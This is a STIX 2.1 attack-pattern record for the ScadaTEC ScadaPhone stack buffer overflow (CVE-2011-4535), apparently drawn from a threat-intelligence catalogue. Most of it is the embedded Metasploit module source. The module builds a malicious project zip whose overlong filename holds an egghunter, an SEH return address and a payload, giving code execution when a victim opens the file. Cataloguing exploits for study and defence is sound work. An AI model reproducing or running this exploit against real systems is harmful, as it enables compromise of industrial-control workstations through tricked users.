{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--02d21115-778d-4077-9889-982a365fef78",
    "created": "2024-08-14T16:36:29.316767Z",
    "modified": "2024-08-14T16:36:29.316772Z",
    "name": "ScadaTEC ScadaPhone Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in version 5.3.11.1230 of scadaTEC's ScadaPhone.  In order for the command to be executed, an attacker must convince someone to load a specially crafted project zip file with ScadaPhone. By doing so, an attacker can execute arbitrary code as the victim user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/scadaphone_zip.rb",
            "external_id": "scadaphone_zip.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4535"
        },
        {
            "source_name": "reference",
            "url": "http://www.scadatec.com/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ScadaTEC ScadaPhone Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow vulnerability in\n        version 5.3.11.1230 of scadaTEC's ScadaPhone.\n\n        In order for the command to be executed, an attacker must convince someone to\n        load a specially crafted project zip file with ScadaPhone.\n        By doing so, an attacker can execute arbitrary code as the victim user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'mr_me <steventhomasseeley[at]gmail.com>', # found + msf\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-4535' ],\n          [ 'OSVDB', '75375' ],\n          [ 'URL', 'http://www.scadatec.com/' ],\n          [ 'EDB', '17817' ],\n        ],\n      'Platform'          => [ 'win' ],\n      'Payload'           =>\n        {\n          'Space'    => 700,\n          'BadChars' => \"\\x00\\x0a\\x0d\",\n          'DisableNops' => true,\n        },\n      'Targets'        =>\n        [\n          # POP ESI; POP EBX; RETN [ScadaPhone.exe]\n          [ 'Windows Universal', { 'Ret' => 0x004014F4 } ],\n        ],\n      'DisclosureDate' => '2011-09-12',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ true, 'The output file name.', 'msf.zip']),\n        ])\n  end\n\n  def exploit\n\n    eggoptions =\n    {\n      :checksum => false,\n      :eggtag => 'zipz'\n    }\n\n    hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)\n\n    fname = rand_text_alpha_upper(229)\n    fname << hunter\n    fname << rand_text_alpha_upper(48-hunter.length)\n    fname << Rex::Arch::X86.jmp_short(-50)\n    fname << rand_text_alpha_upper(2)\n    fname << [target.ret].pack('V')\n    fname << rand_text_alpha_upper(100)\n    fname << egg\n    fname << rand_text_alpha_upper(4096-fname.length)\n    fname << [0x7478741e].pack('V')\n\n    zip = Rex::Zip::Archive.new\n    xtra = [0xdac0ffee].pack('V')\n    comment = [0xbadc0ded].pack('V')\n    zip.add_file(fname, xtra, comment)\n\n    # Create the file\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n\n    file_create(zip.pack)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-09-12",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}